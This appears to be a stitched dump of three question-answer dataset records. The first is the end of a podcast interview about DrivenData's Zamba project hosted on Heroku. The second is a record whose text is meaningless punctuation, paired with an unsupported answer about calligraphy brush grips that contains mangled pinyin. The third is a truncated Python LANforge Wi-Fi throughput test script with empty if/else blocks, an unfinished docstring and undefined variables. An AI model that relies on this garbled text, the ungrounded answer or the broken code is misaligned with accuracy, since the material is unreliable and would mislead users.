these tools or had a $100,000 license to use them.\nIsaac Slavitt: The democratizing effect of open source, and not just open source but now having platforms like Heroku where you can create a free account and experiment with getting your stuff out there, or if you need to run a computation, there are platforms where you can run very computationally expensive code that previously you could only do if you were really a graduate researcher at an institution that owned a cluster. I think that has really pushed the field ahead quite a bit and opened it up to a lot of people who wouldn't have been able to participate before.\nJonan Scheffler: I do want to ask you a little bit about the infrastructure there at Driven Data. So far, we've talked about hosting your models on Heroku. Now, when you're training a model, this is a pretty specialized task, and there are specialized services for doing this, for example TensorFlow. I come away with my trained model, and I can put that up anywhere, for example in the Zamba use case to allow researchers to upload their videos and find out if there's a pangolin in them. You've seen your users using Heroku for that. Is that correct?\nJonan Scheffler: I'll take a data set, and I'll run maybe 80% of my data through with the input and the output both present so that my model adjusts it weights to the existing identification. Then, the remaining 20%, I'm allowed to use to test my model then, or it gives me the opportunity to use to test my model, right?\nIsaac Slavitt: That's right, and so the process of finding those weights, when you really boil down most statistical modeling, we're just trying to get a bunch of numbers that either push a prediction into a certain class, or push it towards a yes or a no in the case of binary classification, or try to find a certain number in the output. It all comes back to just finding these weights, but the optimization algorithms that you need to run to find those weights when you're feeding the model new examples, that can be extremely expensive to do. Once you have the weights, it's generally just a process of feeding in the input, plugging it in, and then you get out your answer.\nJonan Scheffler: To your point, then using that data becomes much, much less expensive, because you're just putting the trained model up on a site like Heroku, and you're only paying us whatever you're paying for your dynos and your database, right?\nIsaac Slavitt: That's right. To bring this example back to your question, we talked about the Zamba competition where people were looking at trying to take these videos of animals and classify them into what exact species it was. At the end of the competition, the organization was interested in developing that further. It's great to have the model, but they wanted people who aren't machine learning researchers to be able to take their new footage, plug it in, and get out a spreadsheet so that would kind of fit into their current workflow of how they assemble their research data.\nIsaac Slavitt: We posed a question to our team. \"How might we build a system that's a thin wrapper around this machine learning model that has an intuitive user interface so that researchers can just sort of upload their videos and get out spreadsheets of predictions?\" They don't have a strong preference as to what output it's in. They just need to be able to work with it, and everybody knows how to work with spreadsheets, if that makes sense.\nJonan Scheffler: Well, and more than that, they're able to write little formulas into their spreadsheets to further extrapolate on the data. This is part of the value of things. I think these interstitial products that kind of glue companies together, you see a lot of startups around this space where small software companies have problems finding docs, internal documents, and so a lot of these startups built these intermediary services that simplify this process.\nJonan Scheffler: Dataclips is a very good example of this kind of thing where I as a developer, I have access to the database, and I can get into the data, but it becomes quite a task for me when everyone on the team needs business intelligence data, and they've got to come to me, and I've got to write these things. If I could just drop a bit of SQL into a website that then they can tweak a little bit, they don't have to come back to me if they decide they also want to search New York. They can just add it to their query, and it empowers people in the organization to kind of shift the load of work around.\nIsaac Slavitt: That's exactly right, and we've actually used Dataclips in that way. Since we use Heroku Postgres for our hosted database, we can connect this. For people who aren't familiar with the tool, there's a kind of clean user interface where you can put a SQL query, and then you can see the results below, and you can export it as a spreadsheet or a variety of different ways, I think.\nIsaac Slavitt: When we've had partners say, \"Hey, we want to see where the leaderboard is as of today,\" we don't want to write custom code to do this all the time, and we don't want to go in and poke around in our production systems, so it's nice to have a dataclip that we can just grab a quick download and send over to them.\nJonan Scheffler: Yeah. I love Dataclips. I actually didn't know of the existence of that product before I came to work at Heroku, but it has been incredibly valuable to me. Tell me a little bit about the structure of Driven Data's applications. You have drivendata.org, the actual web application. Is that a Rails app?\nIsaac Slavitt: It's a Django app.\nJonan Scheffler: Okay. This makes sense to me, of course, and should have been my first guess, because if I am not mistaken, the machine learning community is all but entirely dominated by Pythonistas. You don't think that's true anymore, maybe?\nJonan Scheffler: Is it changing?\nIsaac Slavitt: I think it's... No, I think it's going in that direction. I would say it's probably predominantly the Python/PyData ecosystem. There are still a whole lot of very serious users of R in the data science world, especially people who are in research or academia. R is very popular among data scientists who have more of a statistics background, but especially with tools like TensorFlow and Keras being very Python-centric, I would say that the majority of at least the AI, if not most machine learning or data scientist practitioners, have been moving in the Python direction.\nJonan Scheffler: I think I spoke to some data scientists once who told me that they would write... They would come up with their models in Python, but then they would port them to Java so that they could run more quickly on the JVM in order to train up their models. Does that pattern still apply?\nIsaac Slavitt: Yeah. I think there's an interesting trend in our field where at first, you kind of just had data scientists, which pessimists were saying was just a rebranding of other titles. I think there's a legitimate truth that a lot of the skillsets are older than the term data science, but five years ago, a data scientist was doing everything, so they were doing the exploratory data analysis, building models, and then trying to figure, maybe, how to get this working in production in some way. Either that, or their work would end once they built the model, and then they throw it over the wall, and the traditional software engineering structure would have to pick that up and run with it.\nIsaac Slavitt: Now, especially in the last, I would say, two to three years, we're seeing more and more organizations have data scientists and data engineers who sit between in the data scientists and the software engineering stuff. The data engineer's job is to get data out of all of these varied systems into a format that the data scientists can use, then also help convert the resulting research code, really, that comes from the data science process to be more like production code.\nIsaac Slavitt: This is very organization specific. Some organizations just have software engineers who do a little data scientist. Some have very clear firewalls, and the data scientists just finish up, and then throw it over the wall. Some organizations have a sort of hybrid structure where data engineers bridge that gap, or they push the responsibility to the data scientists to get up to speed on their software best practices so that their work can be more directly adopted into the engineering organization.\nJonan Scheffler: You are using Heroku to ship drivendata.org, and the Zamba project uses Heroku to host the model. Is that correct?\nIsaac Slavitt: Yeah. The Zamba project hosts the web application and the database and the queuing layer on Heroku. The only part that isn't on Heroku is the compute task which runs the model outputs, the model predictions, and that happens on a service called Paperspace which provides sort of ephemeral containers that are specially suited for GPU-enabled, compute-intensive tasks. The entire kind of platform is on Heroku. The only part that gets computed elsewhere is the GPU-intensive prediction part of it.\nJonan Scheffler: You're using these Paperspace instances. Is it more of like a function as a service style platform? Are you just giving it a bit of code to run, or are you configuring and setting up a server yourself?\nIsaac Slavitt: Yeah, it's sort of... They have a few different offerings, and I don't want to try to sum up all of them. I'm not totally familiar with all. They have some offerings that seem to be more kind of permanent computing environment, but the one that we're using is, I believe, called Gradient, and it's for these kind of batch jobs where you just need some compute at a certain term.\nIsaac Slavitt: It's a little like a function as a service, so you give it a container. It knows how to run that container. It has whatever new inputs you're giving it, and then it puts the outputs wherever you want. For us, we ingest those back into the web application so that we can display those outputs in a helpful way for researchers and let them kind of manipulate that data and export it.\nJonan Scheffler: At some point, an API call comes back, and you said about making a spreadsheet for someone.\nIsaac Slavitt: Yeah, that's exactly right. The way it works is, let's say I'm a researcher at Max Planck Institute, and I just got my new batch of videos back from the field. What I want to do now is I want to get these all classified, so I go on Zamba Cloud. I either upload the files directly if they're small enough, or I point the web application to an SFTP server that has all of the files. Then, the application takes all those files, copies them over to Amazon S3, which is where the data is stored. Then, it kicks off a job, one of these compute jobs on Paperspace we were just talking about.\nIsaac Slavitt: At that point, what we kind of need to do is asynchronously babysit a process that is happening elsewhere, so we have this Heroku scheduler script that on a certain heartbeat will ask Paperspace, \"Hey, which jobs do you still have running, and what status are they? Have they succeeded? Have they failed,\" so that it can update our state on the web application side.\nJonan Scheffler: You're basically using promises just as API calls to connect to an SFTP server, get the data up into S3. Then, when the API tells you that your job is finished, get that data back and put into a spreadsheet. It's simple, really. It's just that that you have to do.\nIsaac Slavitt: Yeah, that's exactly right. We even use that sort of promises concept in the application. What we call the Heroku scheduler script, its job is to poll, so it's trying to update the state of these long-operations that it doesn't have any visibility into directly.\nJonan Scheffler: That's interesting, but Paperspace being a very specialized tool sounds like it's exactly what you would want to use for this thing, so that's a good thing to keep in mind. You've got this Django app for Zamba running up on Heroku, and you mentioned that you're using Postgres. Is this the database that you use across your applications? As far as Driven Data is concerned, Postgres is the one true database.\nIsaac Slavitt: That's the one true database. I'll fight anyone who says otherwise.\nJonan Scheffler: I have actually offered to fight people live on the floor at Dreamforce. As I'm giving a demo in their booth, I said, \"Postgres is the one true database. It supplants all other databases. Come fight me.\"\nIsaac Slavitt: Yeah, and I'm not a database expert, but some of those advanced features, it just feels like we couldn't live without. The JSONB fields, we make heavy use of in the Zamba application because we have our own database representation of these processing jobs and predictions and all of those things, but it's also occasionally important to us to look at the last payload that we got back from the API. It's just awesome that all we have to do is stuff that into a JSONB, so there's no... These days, you don't really have to choose between structured or unstructured, or SQL and NoSql. You can kind of have the best of both worlds, especially if you use a modern database like Postgres.\nJonan Scheffler: I 1,000% agree, and this is actually almost becoming a best practice for me in my applications where I do store my API payloads. It's so useful when you're trying to debug across a service-oriented architecture. I've got multiple applications in my microservices architecture, and I'm trying to debug a request across each of those. Having the actual payloads that were returned from the various APIs stored in a JSONB field is incredibly valuable, and I do try to set it up for at least all of my lower-volume API calls in my applications. It's super useful.\nIsaac Slavitt: Yeah. To be honest, I think Postgres is not the only relational database. I think at this point, if you choose any of them, you're probably fine. They have a good amount of parity these days. What I think is funny and kind of my favorite genre of post on Hacker News or other places where developers talk about stuff is when people are about to start a new business or something, and they're talking about using the hot, new event-sourcing data scheme or something like that, a true big-data problem that Google is grappling with when they don't even have five users whose data they need to store yet. I kind of think that that's like the Dilbert cartoon of our time.\nJonan Scheffler: Any other interesting corners of the Heroku platform you want to... anything you feel like you're doing is maybe novel you want to share with us?\nIsaac Slavitt: I have to be completely honest in saying that nothing that we are doing on Heroku is novel, and I consider that a good thing.\nJonan Scheffler: I agree with you. I agree with you. I was thinking this earlier when you were talking about the database, that people are lining up to use these new technologies and these new tools, and a lot of times, we're reinventing things that already existed, or we're making small, progressive steps forward. It's not necessary to jump to the newest, hottest thing all the time.\nJonan Scheffler: Use boring technology. I used Heroku long before I ever worked here, because I never thought about it ever. It would run my application, and occasionally I'd get an email, and it would say, \"Hey, there was a critical error with your database. Everything went to hell, and your whole production database was deleted, but we saved you, and here's your email letting you know that we restored it from backup while you were sleeping. Now, you have no further obligations to pursue.\" That is the kind of technology that I want.\nIsaac Slavitt: Yesterday, I got an email that said, \"Hey, did you know that one of the indexes on your primary production database is corrupted from the application layer? Hey, by the way, the way you fix this is you just run this command.\" I ran that command, and it worked out well.\nJonan Scheffler: See, this is exactly what I need more of in my life. So much of my day is just figuring out what obscure bug I've managed to encounter. My worst days as a developer are when I spend my first four or six hours of the day screwing around with my development environment, everything's broken, trying to get my pipeline set up so that I can ship my applications effectively. There are so many things that will already go wrong with your development environment. Simplify the pieces that you can. Use boring technology.\nIsaac Slavitt: We've had people say, \"You could just have a co-located server somewhere, and you could do this, that, and the other thing.\" I always say, \"I know my limits. I'm not a dumb person on my good days, but I don't really want to be responsible for applying critical security updates to 8,000 components of this Linux system running somewhere in the cloud that I don't really understand, so why don't I focus on the data science and software development parts and let somebody smart take care of the rest?\"\nJonan Scheffler: I love playing around with security, but I'd never trust myself to harden a production server. The idea is just crazy to me.\nIsaac Slavitt: You don't want to play with security. You don't want to put your living in jeopardy dealing with that if you're not a security expert.\nJonan Scheffler: Exactly. Exactly. Well, Isaac, I think I have mostly run out of things to ask you about. Actually, that's never going to be true, because I am fascinated by Driven Data, and I'm going to keep watching these competitions. I'm looking forward to a day where I know enough machine learning that I can dabble in some of these, because I'm really impressed by the work you're doing. Again, I applaud you for your commitment to open source. I really, really appreciate that you're releasing these models under the MIT license specifically, my favorite license, the set-and-forget open-source license that actually contributes back to the world and lets people use it however they want.\nJonan Scheffler: You're doing great work, Isaac, and I thank you so much for joining me. I really appreciate your time.\nIsaac Slavitt: My pleasure, and thank you for supporting the Zamba project with the Heroku credits that you gave us.\nJonan Scheffler: I am happy to do it, and we will continue supporting Zamba as long as we are able. For science.\nJonan Scheffler: Have a good day, Isaac. Bye-bye.\nIsaac is a co-founder and data scientist at DrivenData. He holds a master's in Computational Science and Engineering, and a BS in Operations Research.", "question": " What is DrivenData and what are some of the real-world problems that it has solved using data science competitions?", "answer": "\n        DrivenData is a platform that uses data science competitions to solve real-world problems. Some examples of problems it has solved include:\n        - Using AI to classify animal species in African forests without disturbing the natural ecosystem (Zamba competition)\n        - Using machine learning to predict future outbreaks of dengue fever (DengAI competition)\n        - Automating the process of labeling videos of animals in camera traps to aid conservation efforts (Zamba competition)\n        - Developing software to detect lung cancer from early screening scans (Concept to Clinic competition)\n        DrivenData solicits help from data scientists by running \"competitions\" where teams are asked to comb through data sets to solve real-world problems. The competitions offer cash rewards for the best solutions. By using data science competitions, DrivenData is able to harness the power of crowdsourcing to solve important problems that have a real-world impact."}
{"text": "[]\n:: :\"\",30,,,\"\" , :,,\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\",,,,,,,,, ,,,\"\",,\"\",,\"\",,,,\",\",\",\",\"\"\"\",,\"\",\"\",,,,\"\",\"\",,,,,,,,,,(),,\"\"\"\",\"\" ,,,,,,(),,,\"\",\"\",\"\",,,,:\"\",\"\",, 4,,,,,,,,,,,,,,,,\"\"\"\",\"()\",,,, :,,,,,,,,(),,, ,,,,,,,,,,, ,,,, ,,,,,,, :,,\",\",,\"\"\"\"\"\",\"\"\"\"\"\"\"\",,,\",\",, 2060,,,,,,,,\"\" ,,,,\"\",,,(,72), ::\",...,\",,,\"\",,,,,:\"\",,,,,,,,,,,,,,,,,\"\" ,,,,,, ,:,,\"\"\",,,\",:\",,  ,,,,,\":\",,  ,,  ,, ,  ,,,,,  \" ,,,,,,,,,,,,, ,:\",,,,\",,,, ,,,,\"\"\"\",,\"\",,,,,\"\"\"\",,,,\"\",,,\"\"\"\"\"\",\"\",\"\",,,,,,,, ,,,,,,,,,,,,,,:,,,,,,,,45,,,,,,,,,,,,,, :,,,,,,, ::,,,,,,,,:,,,,,, ::\"\",,,,,,,,\"\"\"\",,,,, :,,,,,, :,,,,,, ,,,,,,, :,,,,, :,,,,,\"\"\",\",,,, ,\"\",,,,,,,,,,\"\"\"\",,  :,,,,,,,,,,,, ,\"\"(),\"\"\"\"(),\"\",,,\"\",,, ,,(),, ,,(),,,\"\",,,,,,,,,,,,,,,(),,,\"\"\"\",,\"\",,,, ,,,,,,,,,\",\",,,\"\"\"\",,\"\"\"\"\"\",\"\"\"\",,,,,, :,,,\"\",,,,\"\" ,,,,,,,,,,,,,,,,,,,,,, :,,,,,,,,,:1970,72,,,,,,,,,,\"\"\"\",,,,,:\"\",(19731),,: :,,,,,,,,,,,,,,,:\"\",,,,,:\",,,(),,,,,\",,,,,,,\"\"\"\":\"\",:\"\",,:,,,,,,,,,,,,,,,,:\",\",,,:\"(),,,\",,,,,,,,,,,,, ,,,,,,,,,2060,(302),,,,,, ,,,,,,,,,,,,, ,,,,,,,,,,,:\",\":\": , \",, ,,,,,,,,,,,,,,,,,,,\"\",,\"\"\"\" :,,,,:\"\",,,, :,,,,, :,, :,,,,,,,:,,,,,,,,, :,,,,,,,,,,,,,,, ,,,,,,,,,, \"\" :,,\"\"\"\"\"\",,\"\",\"\",,,(),,,,,,(,),,,,\"\"\"\"\"\"():\" ,  \",,, ,\"\",\"\"\"\",\"\",,\"\",\",\"\"\"(),()(\"\")\"\"\"\",,\",\",\"\",,\"\",,,\"\",\"\"\"\"\"\",,,\",\",,,\",\",\"\",,, :\"\",\"\",,,\",\",, \"\",,,,,,,,,,,,,,, :,\",\",\"\",\"\"\"\"\"\",,,,,\"\"(), :\"\",:,,,,,,,,,,,, :,,,,,,,,,,,,,,,,,,\"\",,,,,,,,,,,,,,,,,,,,:,,,,,,,,,,,,,,,,,,,,,,,,,, ,(),,,,,,,,,,,,,,,,,,,,,, ,:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hak ,,,,, ::\",,,,,,,,,\",\"\",,,,,,,, ,,,,,,,,,,,, :\"\",,,,,,, :,,,,,\",\",\"...\",,,,,\",,\",,,,,,,,,,,, ,,,,,(),,,,,\"\",\",\" ,,,,,,,,,,,,,,,,,,,,,,,- , :,,,,\",\",,,,,,,,,,,,,,,,,,, ,,,:\",,,\"\"\",,\"\",,,,,,,, ,,,(),,,,,\"\",(),,,,,\"\",", "question": " What is the \"grip method\" in calligraphy and how is it used to write different sizes of Chinese characters?", "answer": "\n        In Chinese calligraphy, \"grip method\" refers to the way the writer holds the brush. Different grip methods are used to write different sizes of Chinese characters. For example, for small characters like xngshu, the writer uses a firm grip to control the brush. For larger characters like dngshu, the writer uses a looser grip to allow more movement of the brush. So the grip method changes depending on the size of the character to be written, with a firmer grip for smaller characters and a looser grip for larger characters."}
{"text": "# language: Python\n#!/usr/bin/env python3\r\n\r\n\"\"\"\r\nthroughput.py will\n\"\"\"\r\n\r\nimport sys\r\nimport importlib\r\nimport paramiko\r\nimport argparse\r\nimport pprint\r\nfrom datetime import datetime\r\nimport time\r\nimport traceback\r\nimport os\r\nimport matplotlib.patches as mpatches\r\nimport pandas as pd\r\nimport logging\r\n\r\nif sys.version_info[0]!= 3:\r\n    print(\"This script requires Python 3\")\r\n    exit(1)\r\n\r\n\r\nsys.path.append(os.path.join(os.path.abspath(__file__ + \"../../../\")))\r\n\r\nLFUtils = importlib.import_module(\"py-json.LANforge.LFUtils\")\r\nlfcli_base = importlib.import_module(\"py-json.LANforge.lfcli_base\")\r\nLFCliBase = lfcli_base.LFCliBase\r\nrealm = importlib.import_module(\"py-json.realm\")\r\nRealm = realm.Realm\r\nlf_report = importlib.import_module(\"py-scripts.lf_report\")\r\nlf_graph = importlib.import_module(\"py-scripts.lf_graph\")\r\nlf_kpi_csv = importlib.import_module(\"py-scripts.lf_kpi_csv\")\r\nlogger = logging.getLogger(__name__)\r\nlf_logger_config = importlib.import_module(\"py-scripts.lf_logger_config\")\r\ncreate_bridge = importlib.import_module(\"py-scripts.create_bridge\")\r\nCreateBridge = create_bridge.CreateBridge\r\n\r\n'''\r\nif sys.version_info[0]!= 3:\r\n    print(\"This s\n'''\r\n\r\nclass IPV4VariableTime(Realm):\r\n    def __init__(self, ssid=None,   security=None,       password=None,   sta_list=[],   name_prefix=None,   upstream=None,\r\n                 radio=None,        host=\"localhost\",    port=8080,       mode=0,        ap=None,            side_a_min_rate= 56,\r\n                 side_a_max_rate=0, side_b_min_rate=56,  side_b_max_rate=0,              number_template=\"00000\",\r\n                 test_duration=\"5m\", use_ht160=False,    _debug_on=False,                _exit_on_error=False,\r\n                 _exit_on_fail=False, _vap_radio=None,   _vap_list = 'vap0000', _dhcp = True ):\r\n        super().__init__(lfclient_host=host, lfclient_port=port),\r\n        self.upstream = upstream\r\n        self.host = host\r\n        self.port = port\r\n        self.ssid = ssid\r\n        self.sta_list = sta_list\r\n        self.vap_list = _vap_list\r\n        self.security = security\r\n        self.password = password\r\n        self.radio = radio\r\n        self.vap_radio = _vap_radio\r\n        self.mode = mode\r\n        self.ap = ap\r\n        self.number_template = number_template\r\n        self.debug = _debug_on\r\n        self.name_prefix = name_prefix\r\n        self.test_duration = test_duration\r\n        self._dhcp = _dhcp\r\n        self.local_realm = realm.Realm(lfclient_host=self.host, lfclient_port=self.port)\r\n\r\n        # initializing station profile\r\n        '''\r\n        self.station_profile = StationProfile(lfclient_url=self.lfclient_url,   local_realm=super(), debug_=self.debug,     up=False,\r\n                                              dhcp = self._dhcp,                ssid = self.ssid,    ssid_pass = self.password,\r\n        '''\r\n        self.station_profile = self.local_realm.new_station_profile()\r\n\r\n        if self.station_profile.use_ht160:\r\n            self.station_profile.mode = 9\r\n        self.station_profile.mode = mode\r\n\r\n\r\n        # initializing VAP profile\r\n        self.vap_profile = self.new_vap_profile()\r\n        self.vap_profile.vap_name = self.vap_list\r\n        self.vap_profile.ssid = self.ssid\r\n        self.vap_profile.security = self.security\r\n        self.vap_profile.ssid_pass = self.password\r\n        self.vap_profile.mode = self.mode\r\n        if self.debug:\r\n            logger.info(\"----- VAP List ----- ----- ----- ----- ----- ----- \\n\")\r\n            pprint.pprint(self.vap_list)\r\n            logger.info(\"---- ~VAP List ----- ----- ----- ----- ----- ----- \\n\")\r\n\r\n        self.cx_profile = self.new_l3_cx_profile()\r\n        self.cx_profile.host = self.host\r\n        self.cx_profile.port = self.port\r\n        self.cx_profile.name_prefix = self.name_prefix\r\n        self.cx_profile.side_a_min_bps = side_a_min_rate\r\n        self.cx_profile.side_a_max_bps = side_a_max_rate\r\n        self.cx_profile.side_b_min_bps = side_b_min_rate\r\n        self.cx_profile.side_b_max_bps = side_b_max_rate\r\n\r\n\r\n    def start(self, print_pass=False, print_fail=False):\r\n        self.station_profile.admin_up() # admin up the stations\r\n        temp_stas = self.station_profile.station_names.copy()\r\n\r\n        if self.wait_for_ip(temp_stas):\r\n            logger.info(\"admin-up....\")\r\n            self._pass(\"All stations got IPs\")\r\n        else:\r\n            self._fail(\"Stations failed to get IPs\")\r\n            self.exit_fail()\r\n\r\n    def stop(self,trf = True, ad_dwn = True):\r\n        if trf:\r\n        if ad_dwn:\r\n            self.station_profile.admin_down()   # admin down the stations\r\n\r\n    def pre_cleanup(self):\r\n        logger.info(\"clearing...\")\r\n        exist_sta = []\r\n        for u in self.json_get(\"/port/?fields=port+type,alias\")['interfaces']:\r\n            if list(u.values())[0]['port type'] not in ['Ethernet', 'WIFI-Radio', 'NA']:\r\n                exist_sta.append(list(u.values())[0]['alias'])\r\n        self.station_profile.cleanup(desired_stations=exist_sta)\r\n        try:\r\n            exist_l3 = list(filter(lambda cx_name: cx_name if (cx_name!= 'handler' and cx_name!= 'uri') else False,\r\n                                   self.json_get(\"/cx/?fields=name\")))\r\n            list(map(lambda i: self.rm_cx(cx_name=i), exist_l3))\r\n            list(map(lambda cx_name: [self.rm_endp(ename=i) for i in [f\"{cx_name}-A\", f\"{cx_name}-B\"]], exist_l3))\r\n        except Exception as e:\r\n            print(\"###\",e,'###')\r\n\r\n    def build_vaps(self,chn = 36):\r\n        self.vap_profile.use_security(self.security, self.ssid, passwd=self.password)\r\n        self.vap_profile.set_command_param(\"set_port\", \"ip_addr\", \"192.168.0.1\")\r\n        self.vap_profile.set_command_flag(\"set_port\", \"ip_address\", 1)\r\n        self.vap_profile.set_command_param(\"set_port\", \"netmask\", \"255.255.255.0\")\r\n        self.vap_profile.set_command_flag(\"set_port\", \"ip_Mask\", 1)\r\n        self.vap_profile.set_command_param(\"set_port\", \"gateway\", \"192.168.0.1\")\r\n        self.vap_profile.set_command_flag(\"set_port\", \"ip_gateway\", 1)\r\n        self.vap_profile.set_command_flag(\"set_port\", \"use_dhcp\", 1)\r\n        logger.info(\"Creating VAPs\")\r\n        '''\r\n        self.vap_profile.create(resource = 1,   radio = self.vap_radio,     channel = int(chn),       up_ = True,     debug = False,\r\n                                suppress_related_commands_ = True,          use_radius = True,  hs20_enable = False,\r\n                                create_bridge = False)\r\n        '''\r\n        self.vap_profile.create(resource=1, radio=self.vap_radio, channel=int(chn), up=True, debug=False,\r\n                                suppress_related_commands_=True, use_radius=True, hs20_enable=False)\r\n        self._pass(\"PASS: VAP build finished\")\r\n\r\n        logger.info(\"Creating Bridge\")\r\n        self.create_bridge = CreateBridge(_host=args.mgr,\r\n                                 _port=args.mgr_port,\r\n                                 _bridge_list=bridge_list,\r\n                                 _debug_on=args.debug,\r\n                                 target_device=args.target_device)\r\n\r\n    def build(self):\r\n        self.station_profile.use_security(self.security, self.ssid, self.password)\r\n        self.station_profile.set_number_template(self.number_template)\r\n        self.station_profile.set_command_flag(\"add_sta\", \"create_admin_down\", 1)\r\n        self.station_profile.set_command_param(\"set_port\", \"report_timer\", 1500)\r\n        self.station_profile.set_command_flag(\"set_port\", \"rpt_timer\", 1)\r\n        logger.info(\"Creating stations\")\r\n        start_ip = 2\r\n        if self._dhcp:\r\n            self.station_profile.create(radio=self.radio, sta_names_=self.sta_list, debug=self.debug)\r\n        else:\r\n            for sta_name in self.sta_list:\r\n                ip = \"192.168.0.\"+ str(start_ip)\r\n                self.station_profile.set_command_param(\"set_port\", \"ip_addr\", ip)\r\n                self.station_profile.set_command_flag(\"set_port\", \"ip_address\", 1)\r\n                self.station_profile.set_command_param(\"set_port\", \"netmask\", \"255.255.255.0\")\r\n                self.station_profile.set_command_flag(\"set_port\", \"ip_Mask\", 1)\r\n                self.station_profile.set_command_param(\"set_port\", \"gateway\", \"192.168.0.1\")\r\n                self.station_profile.set_command_flag(\"set_port\", \"ip_gateway\", 1)\r\n\r\n                self.station_profile.create(radio=self.radio, sta_names_=[sta_name], debug=self.debug)\r\n                start_ip += 1\r\n        self.cx_profile.create(endp_type=\"lf_udp\", side_a=self.station_profile.station_names, side_b=self.upstream, sleep_time=0)\r\n        self._pass(\"PASS: Station build finished\")\r\n\r\n    def chn_util(self,ssh_root, ssh_passwd,channnel=0):\r\n        cmd = 'iwpriv wifi1vap0 get_chutil'     # command to get channel utilization\r\n        try:\r\n            ssh = paramiko.SSHClient()\r\n            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\r\n            ssh.connect(ssh_root, 22, 'root', ssh_passwd)\r\n            time.sleep(20)\r\n            stdout = ssh.exec_command(cmd)\r\n            stdout = (((stdout[1].readlines())[0].split(':'))[1].split(' '))[0]\r\n            print(stdout, \"----- channel utilization\")\r\n            return int(stdout)\r\n        except paramiko.ssh_exception.NoValidConnectionsError as e:\r\n            logger.info(\"#### %s ####\", e)\r\n            exit(1)\r\n        except TimeoutError as e:\r\n            # print(\"####\", e, \"####\")\r\n            exit(1)\r\n\r\n    def re_run_traff(self, adj_trf_rate, add_sub_rate):\r\n        logger.info(\"Re-run the traffic...\")\r\n        self.cx_profile.cleanup_prefix()\r\n        time.sleep(.5)\r\n        if add_sub_rate == \"sub\":\r\n            self.cx_profile.side_a_min_bps = abs(int(self.cx_profile.side_a_min_bps) - adj_trf_rate)\r\n            self.cx_profile.side_b_min_bps = abs(int(self.cx_profile.side_b_min_bps) - adj_trf_rate)\r\n        elif add_sub_rate == \"add\":\r\n            self.cx_profile.side_a_min_bps = int(self.cx_profile.side_a_min_bps) + adj_trf_rate\r\n            self.cx_profile.side_b_min_bps = int(self.cx_profile.side_b_min_bps) + adj_trf_rate\r\n        self.cx_profile.created_cx.clear()\r\n        self.cx_profile.create(endp_type=\"lf_udp\", side_a=self.station_profile.station_names, side_b=self.upstream,\r\n                               sleep_time=0)\r\n        self.cx_profile.start_cx()\r\n        print(f\"-------side_a_min_bps  {self.cx_profile.side_a_min_bps}\\n-------side_b_min_bps  {self.cx_profile.side_b_min_bps}\")\r\n\r\n    def table(self,report, title, data, dis=\"\"):\r\n        report.set_obj_html(_obj_title=\"\",_obj=dis)\r\n        report.set_table_title(title)\r\n        report.build_table_title()\r\n        report.build_objective()\r\n        report.set_table_dataframe(data)\r\n        report.build_table()\r\n\r\n    def grph(self,report, dis=\"\", data_set=None, xaxis_name=\"stations\", yaxis_name=\"Throughput 2 (Mbps)\",\r\n             xaxis_categories=None, label=None, graph_image_name=\"\", multi_bar_width = 0,\r\n             xticks_font=10,step = 1):\r\n        report.set_obj_html(_obj_title=graph_image_name, _obj=dis)\r\n        #report.set_graph_title(graph_image_name)\r\n        #report.build_graph_title()\r\n        report.build_objective()\r\n        graph = lf_graph.lf_bar_graph(_data_set = data_set,\r\n                             _xaxis_name = xaxis_name,\r\n                             _yaxis_name = yaxis_name,\r\n                             _xaxis_categories = xaxis_categories,\r\n                             _graph_image_name = graph_image_name.replace(\" \",\"_\"),\r\n                             _label = label,\r\n                             _color = ['darkorange','forestgreen','blueviolet'],\r\n                             _color_edge = 'black',\r\n                             _figsize = (10, 5),\r\n                             _xticks_font= xticks_font,_xaxis_value_location=multi_bar_width,\r\n                             _xaxis_step = step,_legend_handles=None, _legend_loc=\"best\", _legend_box=(1.0,0.5), _legend_ncol=1)\r\n        graph_png = graph.build_bar_graph()\r\n        logger.info(\"graph name {}\".format(graph_png))\r\n        report.set_graph_image(graph_png)\r\n        report.move_graph_image()\r\n        report.build_graph()\r\n\r\n    def generates_csv(self, _columns=None, _rows=None, _filename='test.csv' ):\r\n        if _columns is None:\r\n            _columns = ['Stations', 'bk', 'be', 'vi', 'vo']\r\n        if _rows is None:\r\n            _rows = [['sta0001','sta0002','sta0003','sta0004','sta0005'],\r\n                     [1, 2, 3, 4, 5],\r\n                     [11, 22, 33, 44, 55],\r\n                     [6, 7, 8, 9, 10],\r\n                     [66, 77, 88, 99, 100]]\r\n        rows = _rows\r\n        columns = _columns\r\n        filename = _filename\r\n\r\n        df = {}\r\n        for i in range(len(columns)):\r\n            df[columns[i]] = rows[i]\r\n        csv_df = pd.DataFrame(df)\r\n        logger.info(csv_df)\r\n        csv_df.to_csv(filename, index=False, encoding='utf-8', na_rep='NA', float_format='%.2f')\r\n\r\n    def report(self,util, sta_num, bps_rx_a,bps_rx_b, rep_title, upload = 1000000, download = 1000000,\r\n              test_setup_info = None,input_setup_info = None,threshold=None):\r\n        '''if len(threshold) < len(util):\r\n            for i in range(len(util)):\r\n                try:\r\n                    tmp = threshold[i]\r\n                except IndexError as e:\r\n                    print(f\"Threshold {threshold} and utilization {util}\")\r\n                    threshold.append(100 - int(util[i]))\r\n        print(f\"threshold {threshold} and utilization {util}\")'''\r\n        rx_a,rx_b,pas_fail_up,pas_fail_down,pas_fail_info_up,pas_fail_info_down = [],[],[],[],[],[]\r\n        thrp_b = upload * len(sta_num)  # get overall upload values\r\n        thrp_a = download * len(sta_num)  # get overall download values\r\n        print(f\"given upload--{thrp_b} and download--{thrp_a} values\")\r\n        index = -1\r\n        for a in bps_rx_a:\r\n            index += 1\r\n            if len(a):\r\n                rx_a.append(f'Min: {min(a)} | Max: {max(a)} | Avg: {(sum(a) / len(a)):.2f} | Total: {sum(a):.2f}')\r\n                if thrp_a:\r\n                    print(f\"Expected throughput for util-{util[index]} and threshold-{threshold[index]}---- \"\r\n                          f\"{(thrp_a / 100) * (int(threshold[index]))} \\nGot overall download values for util \"\r\n                          f\"'{util[index]}'----- {sum(a)} \\n \")\r\n                    if (thrp_a / 100) * int(threshold[index]) <= sum(a) and min(a)!= 0:\r\n                    else:\r\n            else:\r\n                pas_fail_down.append(\"NA\")\r\n                rx_a.append(0)\r\n\r\n            if len(bps_rx_b[index]):\r\n                rx_b.append(f'Min: {min(bps_rx_b[index])} | Max: {max(bps_rx_b[index])} | '\r\n                            f'Avg: {(sum(bps_rx_b[index]) / 